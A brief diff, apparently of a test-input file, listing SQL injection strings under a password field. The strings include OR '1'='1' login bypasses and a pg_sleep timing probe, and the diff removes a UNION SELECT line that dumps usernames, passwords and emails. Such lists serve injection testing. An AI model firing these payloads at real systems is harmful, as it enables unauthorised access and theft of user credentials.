@@ -5,5 +5,3 @@ password:
     notthecorrectpassword' OR '1' = '1' ORDER BY username DESC -- 
     anypassword' OR '1' = '1' LIMIT 1 OFFSET 1 -- 
     anypassword' OR '1' = '1'; SELECT pg_sleep(5) -- 
-
-    anypassword' OR 1=1 UNION SELECT id, username, password, email FROM users --
